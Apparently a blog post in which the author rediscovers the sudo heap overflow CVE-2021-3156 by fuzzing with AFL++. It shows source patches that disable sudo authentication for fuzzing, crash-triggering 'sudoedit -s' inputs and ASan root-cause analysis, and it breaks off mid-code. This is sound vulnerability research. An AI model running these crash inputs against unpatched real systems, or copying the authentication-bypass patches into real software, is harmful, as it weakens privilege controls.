{"pages":[{"date":"2024-04-26","image":"/post-resources/CVE-2021-3156/images/rabbit.png","imageAlt":"","link":"https://chalkiadakis.me/posts/cve-2021-3156/","summary":"On a journey to learn more about fuzzing\u0026hellip;","tags":["CVE","fuzzing","vulnerability research"],"text":"so, here we depart with cve-2021-3156. this is a vulnerability in the sudo program that allows privilege escalation. this post is about my personal journey (and notes to my future self) to learn a bit more about fuzzing binaries by rediscovering this vulnerability and then attempting to exploit it. we will work with afl++ as our main choice of fuzzer. throughout this process, i followed along the sudo playlist from liveoverflow in order to steer me towards the correct direction.\nenvironment setup we start by setting up a docker container where we will do our vulnerability research. we install afl++ and other debugging tools. as for a vulnerable sudo, we will fetch its source to our host machine and mount it to the docker image so that we can easily apply modifications.\nwget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz \u0026amp;\u0026amp; \\ tar -xvf sudo-1.8.31p2.tar.gz we wrap all the docker commands in a makefile for convenience.\nnext we spin up our docker image, build sudo from source code using our build script wrapper, and verify that it is indeed a vulnerable version:\nuser:~$ bash -c \u0026#39;exec -a sudoedit /usr/local/bin/sudo-original -s aaa\\\\\u0026#39; malloc(): invalid next size (unsorted) aborted great, we have our test setup. let\u0026rsquo;s move to fuzzing.\nfuzzing for fuzzing, we will use afl++. here are some peculiarities regarding our fuzzing setup:\nwe want to fuzz argv in order to be able to discover the bug. afl++ is designed to fuzz input files. our binary is suid. under normal circumstances we invoke it as uid=1000(user) and the binary runs as uid=0(root). these binaries cannot be debugged in gdb, unless you are root. sudo has different behavior and code paths if you are root or regular user. to fuzz argv, we will use argv_fuzzing/argv-fuzz-inl.h from afl++ source code. this is a header that you include and the program\u0026rsquo;s argv will be read from stdin and replace the old argv. this can also fuzz argv[0] which is required to discover cve-2021-3156, as sudoedit must be ran and not sudo.\nregarding the suid case, we do not have any problem. afl++ builds sudo from source code and applies compile-time instrumentation passes. it does not rely at runtime on ptrace operations, so it can work with suid binaries.\nmodfying sudo to facilitate fuzzing first, let\u0026rsquo;s modify sudo to facilitate argv fuzzing:\ndiff --git a/src/sudo.c b/src/sudo.c index c6d8f62..6e30c9b 100644 --- a/src/sudo.c +++ b/src/sudo.c @@ -69,6 +69,10 @@ #include \u0026#34;sudo_plugin.h\u0026#34; #include \u0026#34;sudo_plugin_int.h\u0026#34; +#ifdef afl_argv +#include \u0026#34;/home/user/aflplusplus/utils/argv_fuzzing/argv-fuzz-inl.h\u0026#34; +#endif + /* * local variables */ @@ -134,6 +138,40 @@ __dso_public int main(int argc, char *argv[], char *envp[]); int main(int argc, char *argv[], char *envp[]) { + printf(\u0026#34;before\\n\u0026#34;); + printf(\u0026#34;argc=%d\\n\u0026#34;, argc); + for(int i=0; i\u0026lt;argc; i++) { + printf(\u0026#34;argv[%d]=%s\\n\u0026#34;, i, argv[i]); + } + #ifdef have___progname + extern const char *__progname; + printf(\u0026#34;__progname=%s\\n\u0026#34;, __progname); + #endif + +#ifdef afl_argv + afl_init_argv(); + printf(\u0026#34;after:\\n\u0026#34;); +#endif + printf(\u0026#34;argc=%d\\n\u0026#34;, argc); + for(int i=0; i\u0026lt;argc; i++) { + printf(\u0026#34;argv[%d]=%s\\n\u0026#34;, i, argv[i]); + } + printf(\u0026#34;envp:\\n\u0026#34;); + for(int i=0; envp[i]; i++) { + printf(\u0026#34;envp[%02d]=%s\\n\u0026#34;, i, envp[i]); + } +#ifdef have___progname + extern const char *__progname; + __progname = argv[0]; +#endif + printf(\u0026#34;__progname=%s\\n\u0026#34;, __progname); + int nargc, ok, status = 0; char **nargv, **env_add; char **user_info, **command_info, **argv_out, **user_env_out; as you can see, we need to also set __progname as it is used by sudo. when we change argv[0], the __progname needs to be manually updated.\nanother quirk of sudo is that it asks for a password and we do not want to input any. but afl++ will hang if we do not fix this. we apply a patch to sudo which disables authentication. this will also allow the fuzzer to progress further, potentially triggering crashes caused by earlier memory corruptions.\ndiff --git a/plugins/sudoers/defaults.c b/plugins/sudoers/defaults.c index 2055f6e..43be816 100644 --- a/plugins/sudoers/defaults.c +++ b/plugins/sudoers/defaults.c @@ -518,6 +518,7 @@ init_defaults(void) #ifndef no_authentication def_authenticate = true; #endif +def_authenticate = false; #ifndef no_root_sudo def_root_sudo = true; #endif diff --git a/plugins/sudoers/check.c b/plugins/sudoers/check.c index 3a18e0c..0d8ed13 100644 --- a/plugins/sudoers/check.c +++ b/plugins/sudoers/check.c @@ -183,7 +183,7 @@ check_user(int validated, int mode) * if the user is not changing uid/gid, no need for a password. */ if (!def_authenticate || user_is_exempt()) { - sudo_debug_printf(sudo_debug_info, \u0026#34;%s: %s\u0026#34;, __func__, + fprintf(stderr, \u0026#34;%s: %s\\n\u0026#34;, __func__, !def_authenticate ? \u0026#34;authentication disabled\u0026#34; : \u0026#34;user exempt from authentication\u0026#34;); exempt = true; diff --git a/plugins/sudoers/parse.c b/plugins/sudoers/parse.c index c44f5fe..5c1ad64 100644 --- a/plugins/sudoers/parse.c +++ b/plugins/sudoers/parse.c @@ -106,8 +106,9 @@ sudoers_lookup_pseudo(struct sudo_nss_list *snl, struct passwd *pw, } } } + /* if (match == allow || user_uid == 0) { - /* user has an entry for this host. */ + // user has an entry for this host. set(validated, validate_success); } else if (match == deny) set(validated, validate_failure); @@ -115,6 +116,9 @@ sudoers_lookup_pseudo(struct sudo_nss_list *snl, struct passwd *pw, set(validated, flag_check_user); else if (nopass == true) def_authenticate = false; + */ + fprintf(stderr, \u0026#34;sudoers_lookup_pseudo forced validate_success\\n\u0026#34;); + set(validated, validate_success); debug_return_int(validated); } @@ -178,7 +182,9 @@ sudoers_lookup_check(struct sudo_nss *nss, struct passwd *pw, } } } - debug_return_int(unspec); + // debug_return_int(unspec); + fprintf(stderr, \u0026#34;sudoers_lookup_check forced allow\\n\u0026#34;); + debug_return_int(allow); } /* we also prevent sudo from running arbitrary commands by patching out that functionality and replacing it with an always-success return value instead. since we prevent sudo from doing fork+execve, this will significantly increase afl++ fuzzing speed:\ndiff --git a/src/sudo_edit.c b/src/sudo_edit.c index c79501d..7a33529 100644 --- a/src/sudo_edit.c +++ b/src/sudo_edit.c @@ -577,6 +577,7 @@ sudo_edit_create_tfiles(struct command_details *command_details, rc = -1; switch_user(command_details-\u0026gt;euid, command_details-\u0026gt;egid, command_details-\u0026gt;ngroups, command_details-\u0026gt;groups); + fprintf(stderr, \u0026#34;editing file %s\\n\u0026#34;, files[i]); ofd = sudo_edit_open(files[i], o_rdonly, s_irusr|s_iwusr|s_irgrp|s_iroth, command_details); if (ofd != -1 || errno == enoent) { @@ -1059,7 +1060,10 @@ sudo_edit(struct command_details *command_details) command_details-\u0026gt;ngroups = user_details.ngroups; command_details-\u0026gt;groups = user_details.groups; command_details-\u0026gt;argv = nargv; - rc = run_command(command_details); + // rc = run_command(command_details); + // fprintf(stderr, \u0026#34;rc=%d\\n\u0026#34;, rc); + rc = 0; + fprintf(stderr, \u0026#34;command %s skipped. rc emulated to success (0)\\n\u0026#34;, command_details-\u0026gt;argv[0]); if (sudo_gettime_real(\u0026amp;times[1]) == -1) { sudo_warn(u_(\u0026#34;unable to read the clock\u0026#34;)); goto cleanup; diff --git a/src/exec.c b/src/exec.c index 4640082..c3eb8c4 100644 --- a/src/exec.c +++ b/src/exec.c @@ -348,6 +348,10 @@ int sudo_execute(struct command_details *details, struct command_status *cstat) { debug_decl(sudo_execute, sudo_debug_exec) + debug_return_int(0); /* if running in background mode, fork and exit. */ if (isset(details-\u0026gt;flags, cd_background)) { diff --git a/plugins/sudoers/visudo.c b/plugins/sudoers/visudo.c index 308c08d..8d48786 100644 --- a/plugins/sudoers/visudo.c +++ b/plugins/sudoers/visudo.c @@ -861,6 +861,10 @@ run_command(char *path, char **argv) int status; pid_t pid, rv; debug_decl(run_command, sudoers_debug_util) + debug_return_int(0); switch (pid = sudo_debug_fork()) { case -1: compiling sudo with afl++ next, we have to compile our sudo code base with afl++ instrumentation.\ncc=afl-clang-fast cxx=afl-clang-fast++ cppflags=\u0026#34;-dafl_argv\u0026#34; \\ ./configure --disable-shared make clean \u0026amp;\u0026amp; make make install cp /usr/local/bin/sudo /usr/local/bin/sudo-afl chmod +s /usr/local/bin/sudo-afl we use afl++ llvm mode since our target is not compiled by default with lto. the #1 rule when instrumenting a target is: avoid instrumenting shared libraries at all cost. always compile libraries you want to have instrumented as static and link these to the target program! (you could also accidentally type \u0026ldquo;make install\u0026rdquo; and install them system wide - so don\u0026rsquo;t!). that\u0026rsquo;s why we use --disable-shared. this will also help triaging crashes. the afl_argv that we pass to the preprocessor is the macro that we introduced with out code patches earlier.\nseed corpus to run afl++ we also need to have some seed input from which afl++ will derive the next states. we could give afl++ already the crashing input but that would be cheating. the best approach here is to give afl++ inputs that showcase all the possible arguments that sudo accepts. we should also include sudoedit in our seed, otherwise afl++ will need a lot of time until it discovers it. for example:\nsudo ls sudoedit -h sudoedit -p foobar by running sudo -h and sudoedit -h we can see all possible arguments. i was lazy and used very trashy seed (please don\u0026rsquo;t be lazy):\necho -en \u0026#39;sudoedit\\x00-h\\x00\\x00\u0026#39; \u0026gt; inputs-sudoedit/1 echo -en \u0026#39;sudoedit\\x00-p\\x00foobar\\x00\\x00\u0026#39; \u0026gt; inputs-sudoedit/2 user:~/mount/sudoedit$ xxd -g 1 inputs-sudoedit/1 00000000: 73 75 64 6f 65 64 69 74 00 2d 68 00 00 sudoedit.-h.. user:~/mount/sudoedit$ xxd -g 1 inputs-sudoedit/2 00000000: 73 75 64 6f 65 64 69 74 00 2d 70 00 66 6f 6f 62 sudoedit.-p.foob 00000010: 61 72 00 00 ar.. as you can see, each argument is separated by a null byte, as specified in argv-fuzz-inl.h#l24. if you have many seed inputs, you can minimize them with afl-cmin. redundant inputs that do not trigger different execution paths are discarded in this way.\nsince these arguments are null terminated and cannot be fed to regular programs, i created a helper program that converts the above format of arguments to regular argv parameters. in that way we can also invoke the non-afl sudo with the same arguments. the converter program is shown below:\n#define _gnu_source #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026#34;argv-fuzz-inl.h\u0026#34; /** * converts arguments formatted for afl\u0026#39;s argv parser, * to regular arguments as if a command was invoked from the shell. * for example: * echo -en \u0026#39;echo\\x00baz\\x00\\x00\u0026#39; | ./afl-argv-converter * will run: * echo baz */ int main(int argc, char* argv[], char *envp[]) { afl_init_argv(); extern const char *__progname; __progname = argv[0]; printf(\u0026#34;executing %s with argc=%d:\\n\u0026#34;, argv[0], argc); for(int i=0; i\u0026lt;argc; i++) { printf(\u0026#34; [*] argv[%d]=%s\\n\u0026#34;, i, argv[i]); } printf(\u0026#34;issuing execvpe now.\\n\u0026#34;); int res = execvpe(argv[0], argv, envp); //we get here only if execvpe fails perror(\u0026#34;execvpe\u0026#34;); return res; } running afl++ let\u0026rsquo;s run afl++ now.\n# run this script in the host os, outside of the docker container # required by afl++ echo core | sudo tee /proc/sys/kernel/core_pattern # disable aslr for reproducibility echo 0 | sudo tee /proc/sys/kernel/randomize_va_space # inside the docker container now indir=inputs-sudoedit odir=outputs-sudoedit rm -rf $indir $odir mkdir -p $indir $odir # seed echo -en \u0026#39;sudoedit\\x00-h\\x00\\x00\u0026#39; \u0026gt; $indir/1 echo -en \u0026#39;sudoedit\\x00-p\\x00foobar\\x00\\x00\u0026#39; \u0026gt; $indir/2 export afl_skip_cpufreq=1 afl-fuzz -i \u0026#34;$indir\u0026#34; -o \u0026#34;$odir\u0026#34; -m fuzzer01 -- /usr/local/bin/sudo-afl this will spawn the main instance and the fuzzer has started! we can spawn multiple instances for parallel fuzzing using the -s flag instead of the -m (aflplus.plus/docs). and we let it run foe a while\u0026hellip;\ntriaging crashes afl++ will find various inputs that crash the binary and will save them in the outputs folder. for example:\nuser:~/mount/sudoedit$ ls -l outputs-sudoedit/default/crashes/ total 52 -rw------- 1 user user 567 apr 2 10:20 readme.txt -rw------- 1 user user 250 apr 2 10:20 id:000000,sig:06,src:000318+000311,time:905880,execs:970028,op:splice,rep:2 -rw------- 1 user user 1486 apr 2 10:21 id:000001,sig:06,src:000037+000581,time:947387,execs:1013412,op:splice,rep:6 -rw------- 1 user user 166 apr 2 11:12 id:000002,sig:06,src:000703+000227,time:4058962,execs:3963633,op:splice,rep:12 -rw------- 1 user user 83 apr 2 11:16 id:000003,sig:06,src:000286,time:4265270,execs:4155000,op:havoc,rep:7 -rw------- 1 user user 27219 apr 2 11:51 id:000004,sig:06,src:000396+000670,time:6352688,execs:5953361,op:splice,rep:7 -rw------- 1 user user 1089 apr 2 13:19 id:000005,sig:06,src:000253+000433,time:11643309,execs:10096980,op:splice,rep:54 user:~/mount/sudoedit$ xxd -g 1 outputs-sudoedit/default/crashes/id\\:000000* 00000000: f3 64 7f ff 75 64 6f 65 64 69 74 00 2d 68 6c 00 .d..udoedit.-hl. 00000010: 2d 69 00 69 49 64 00 2d 00 59 c8 c8 c8 c8 c8 c8 -i.iid.-.y...... 00000020: 81 5f 6c 00 2d 69 00 69 db 74 00 73 96 00 02 73 ._l.-i.i.t.s...s 00000030: bd bd bd 74 00 73 96 00 02 73 73 73 00 64 00 7f ...t.s...sss.d.. 00000040: 73 f3 64 7f ff ff ff f3 64 69 74 17 65 3d 02 00 s.d.....dit.e=.. 00000050: 6b 6f 69 74 1a 2d 68 00 61 64 00 2d 68 00 01 64 koit.-h.ad.-h..d 00000060: 6f 00 6c 00 2d 69 00 69 73 68 ec 78 64 69 74 c8 o.l.-i.ish.xdit. 00000070: c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 73 81 ..............s. 00000080: 5f 6c 00 2d 69 00 69 db 74 00 73 96 00 02 73 73 _l.-i.i.t.s...ss 00000090: 73 73 73 88 74 00 73 96 00 02 35 7f 35 35 64 00 sss.t.s...5.55d. 000000a0: 7f 73 73 64 5f 6c 00 2d 64 69 74 5b 70 00 2d 69 .ssd_l.-dit[p.-i 000000b0: 69 69 69 69 69 69 73 00 71 24 64 69 5a 00 2d 21 iiiiiis.q$diz.-! 000000c0: 30 79 5c 5c 5c 00 10 5c 5c 5c 00 92 69 74 1a 2d 0y\\\\\\..\\\\\\..it.- 000000d0: 68 00 61 64 00 17 68 00 01 64 6f 00 6c 00 2d 69 h.ad..h..do.l.-i 000000e0: 00 69 73 68 ec 00 2d 69 00 64 00 7f 73 73 64 5f .ish..-i.d..ssd_ 000000f0: 6c 00 2d 69 2f 2f 69 db 00 96 l.-i//i... we have to manually investigate those crashes to see if they are interesting to us. let\u0026rsquo;s take one crash and run it:\nuser:~/mount/sudoedit$ cat outputs-sudoedit/default/crashes/id\\:000000* | sudo-afl after: argc=45 argv[0]=dudoedit argv[1]=-hl argv[2]=-i argv[3]=iid argv[4]=- argv[5]=y_l argv[6]=-i argv[7]=it argv[8]=s argv[9]=st argv[10]=s argv[11]=sss argv[12]=d argv[13]=sddite= argv[14]=koit-h argv[15]=ad argv[16]=-h argv[17]=do argv[18]=l argv[19]=-i argv[20]=ishxdits_l argv[21]=-i argv[22]=it argv[23]=s argv[24]=ssssst argv[25]=s argv[26]=555d argv[27]=ssd_l argv[28]=-dit[p argv[29]=-iiiiiiis argv[30]=q$diz argv[31]=-!0y\\\\\\ argv[32]=\\\\\\ argv[33]=it-h argv[34]=ad argv[35]=h argv[36]=do argv[37]=l argv[38]=-i argv[39]=ish argv[40]=-i argv[41]=d argv[42]=ssd_l argv[43]=-i//i argv[44]= envp: envp[00]=hostname=c9414e2626a9 envp[01]=pwd=/home/user/mount/sudoedit envp[02]=home=/home/user envp[03]=ls_colors=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90: envp[04]=term=xterm-256color envp[05]=shlvl=1 envp[06]=lc_ctype=c.utf-8 envp[07]=ps1=\\[\\]\\[\\]\\u\\[\\]:\\[\\]\\w\\[\\]$ envp[08]=path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin envp[09]=_=/usr/local/bin/sudo-afl envp[10]=oldpwd=/home/user/mount/sudoedit/02-exploit __progname=dudoedit malloc(): invalid size (unsorted) aborted seems like a memory corruption crash. these are interesting and we should investiage. but before we do so, one more little thing.\nafl++ exploration mode afl++ offers the exploration mode with -c. in this mode, afl++ takes as seed crashing inputs and tries to find other crashes at different locations. this mode can be used to expand 1 single crash that you may have to many crashes so that you can use differential analysis afterwards.\nminimal crash poc now that we have a crashing input that leads to memory corruption, it is time to minimize it. afl-tmin can minimize a crashing input so that only the significant bytes are kept which still trigger the crash. other irrelevent bytes that do not affect the crash are iteratitevly removed.\nuser:~/mount/sudoedit$ afl-tmin -i outputs-sudoedit/default/crashes/id\\:000000* -o minimized.in sudo-afl afl-tmin++4.10c by michal zalewski [+] read 250 bytes from \u0026#39;outputs-sudoedit/default/crashes/id:000000,sig:06,src:000318+000311,time:905880,execs:970028,op:splice,rep:2\u0026#39;. [*] spinning up the fork server... [+] all right - fork server is up. [*] target map size: 9463 [*] performing dry run (mem limit = 0 mb, timeout = 1000 ms)... [+] program exits with a signal, minimizing in crash mode. [*] stage #0: one-time block normalization... [+] block normalization complete, 226 bytes replaced. [*] --- pass #1 --- [*] stage #1: removing blocks of data... block length = 16, remaining size = 250 block length = 8, remaining size = 192 block length = 4, remaining size = 192 block length = 2, remaining size = 180 block length = 1, remaining size = 178 [+] block removal complete, 73 bytes deleted. [*] stage #2: minimizing symbols (10 code points)... [+] symbol minimization finished, 2 symbols (2 bytes) replaced. [*] stage #3: character minimization... [+] character minimization done, 1 byte replaced. [*] --- pass #2 --- [*] stage #1: removing blocks of data... block length = 16, remaining size = 177 block length = 8, remaining size = 177 block length = 4, remaining size = 177 block length = 2, remaining size = 177 block length = 1, remaining size = 177 [+] block removal complete, 0 bytes deleted. file size reduced by : 29.20% (to 177 bytes) characters simplified : 129.38% number of execs done : 180 fruitless execs : path=110 crash=0 hang=0 [*] writing output to \u0026#39;minimized.in\u0026#39;... [+] we\u0026#39;re done here. have a nice day! user:~/mount/sudoedit$ xxd -g 1 outputs-sudoedit/default/crashes/id\\:000000* 00000000: f3 64 7f ff 75 64 6f 65 64 69 74 00 2d 68 6c 00 .d..udoedit.-hl. 00000010: 2d 69 00 69 49 64 00 2d 00 59 c8 c8 c8 c8 c8 c8 -i.iid.-.y...... 00000020: 81 5f 6c 00 2d 69 00 69 db 74 00 73 96 00 02 73 ._l.-i.i.t.s...s 00000030: bd bd bd 74 00 73 96 00 02 73 73 73 00 64 00 7f ...t.s...sss.d.. 00000040: 73 f3 64 7f ff ff ff f3 64 69 74 17 65 3d 02 00 s.d.....dit.e=.. 00000050: 6b 6f 69 74 1a 2d 68 00 61 64 00 2d 68 00 01 64 koit.-h.ad.-h..d 00000060: 6f 00 6c 00 2d 69 00 69 73 68 ec 78 64 69 74 c8 o.l.-i.ish.xdit. 00000070: c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 73 81 ..............s. 00000080: 5f 6c 00 2d 69 00 69 db 74 00 73 96 00 02 73 73 _l.-i.i.t.s...ss 00000090: 73 73 73 88 74 00 73 96 00 02 35 7f 35 35 64 00 sss.t.s...5.55d. 000000a0: 7f 73 73 64 5f 6c 00 2d 64 69 74 5b 70 00 2d 69 .ssd_l.-dit[p.-i 000000b0: 69 69 69 69 69 69 73 00 71 24 64 69 5a 00 2d 21 iiiiiis.q$diz.-! 000000c0: 30 79 5c 5c 5c 00 10 5c 5c 5c 00 92 69 74 1a 2d 0y\\\\\\..\\\\\\..it.- 000000d0: 68 00 61 64 00 17 68 00 01 64 6f 00 6c 00 2d 69 h.ad..h..do.l.-i 000000e0: 00 69 73 68 ec 00 2d 69 00 64 00 7f 73 73 64 5f .ish..-i.d..ssd_ 000000f0: 6c 00 2d 69 2f 2f 69 db 00 96 l.-i//i... user:~/mount/sudoedit$ xxd -g 1 minimized.in 00000000: 30 65 64 69 74 00 2d 69 00 30 30 30 30 30 30 30 0edit.-i.0000000 00000010: 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 0000000000000000 00000020: 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 0000000000000000 00000030: 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 0000000000000000 00000040: 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 0000000000000000 00000050: 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 0000000000000000 00000060: 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 0000000000000000 00000070: 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 0000000000000000 00000080: 30 30 30 30 30 5c 00 30 30 30 30 30 30 30 30 30 00000\\.000000000 00000090: 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 0000000000000000 000000a0: 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 0000000000000000 000000b0: 30 0 let\u0026rsquo;s also verify that the new minimized input stil crashes the binary in the same way:\nuser:~/mount/sudoedit$ cat minimized.in | sudo-afl after: argc=4 argv[0]=0edit argv[1]=-i argv[2]=0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\\ argv[3]=000000000000000000000000000000000000000000 envp: envp[00]=hostname=c9414e2626a9 envp[01]=pwd=/home/user/mount/sudoedit envp[02]=home=/home/user envp[03]=ls_colors=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90: envp[04]=term=xterm-256color envp[05]=shlvl=1 envp[06]=lc_ctype=c.utf-8 envp[07]=ps1=\\[\\]\\[\\]\\u\\[\\]:\\[\\]\\w\\[\\]$ envp[08]=path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin envp[09]=_=/usr/local/bin/sudo-afl envp[10]=oldpwd=/home/user/mount/sudoedit/02-exploit __progname=0edit malloc(): invalid size (unsorted) aborted still crashing. awesome!\nwith afl-anlyze we can also visualize which bytes are important in our input. afl-analyze takes an input file and attempts to sequentially flip bytes and observe the behavior of the tested program. it then color-codes the input based on which sections appear to be critical and which are (probably) not. it can often offer quick insights into complex file formats. this is useful to run on inputs that crash the binary and we are interested in seeing which parts of the input control the crash:\nit is fascinating to see that afl++ marks the \u0026ldquo;edit\u0026rdquo; of argv[0] as magic bytes. same for the \\\\ which is (spoiler alert) the culprit of the crash. these magic values are part of if conditions. an explanation for the categories of bytes that afl-anlyze identifies can be found in afl-1.readthedocs.io/en/latest/about_afl.html#the-afl-analyze-tool.\nroot cause analysis we have a crash. some memory got corrupted and malloc failed. we need to identify the exact location where the memory corruption happens.\nit is important to understand that the effects of memory corruption are not visible immidetly. there is a bug in the code and when that happens memory gets corrupted. however, the program might not immidietely crash. it might continue on and when accessing the corrupted memroy, because of the corruption and unexpected contents and structure, it will crash.\nfor example, memory corruption happened and caused overwritting of a neighboring object. the object is not processed until 100 function calls away. when the object is processed, the program crashes because of malformed data in that object.\nso, with root cause analysis we aim to pinpoint exactly the offending source code line (bug) that causes memory corruption and subsequently the crash.\nsince we have a heap memory corruption as shown by our input earlier, we will use asan to find it. let\u0026rsquo;s rebuild sudo with asan and debug information but without afl++ this time. still, we will pass arguments in afl++ style (-dafl_argv):\n# https://clang.llvm.org/docs/addresssanitizer.html#usage # same clang version as afl-clang-fast cflags=\u0026#34;-fsanitize=address -fno-omit-frame-pointer -ggdb -o0\u0026#34; ldflags=\u0026#34;-fsanitize=address\u0026#34; cc=clang-14 cxx=clang++-14 \\ cppflags=\u0026#34;-dafl_argv\u0026#34; \\ cflags=\u0026#34;$cflags\u0026#34; \\ cxxflags=\u0026#34;$cflags\u0026#34; \\ ldflags=\u0026#34;$ldflags\u0026#34; \\ ./configure --disable-shared make clean \u0026amp;\u0026amp; make make install cp /usr/local/bin/sudo /usr/local/bin/sudo-asan chmod +s /usr/local/bin/sudo-asan let\u0026rsquo;s run sudo-asan binary now with the mnimized.in input:\nawesome! we know exactly the source code location! the crash above shows that it is a haep-buffer-overflow that happened at sudoers.c:887 and the overflown buffer was allocated at sudoers.c:865. let\u0026rsquo;s examine!\n// sudoers.c 860: /* alloc and build up user_args. */ 861: for (size = 0, av = newargv + 1; *av; av++) 862: size += strlen(*av) + 1; 863: 864: 865: if (size == 0 || (user_args = malloc(size)) == null) { //offending malloc 866: sudo_warnx(u_(\u0026#34;%s: %s\u0026#34;), __func__, u_(\u0026#34;unable to allocate memory\u0026#34;)); 867: debug_return_int(-1); 868: } //............. 883: for (to = user_args, av = newargv + 1; 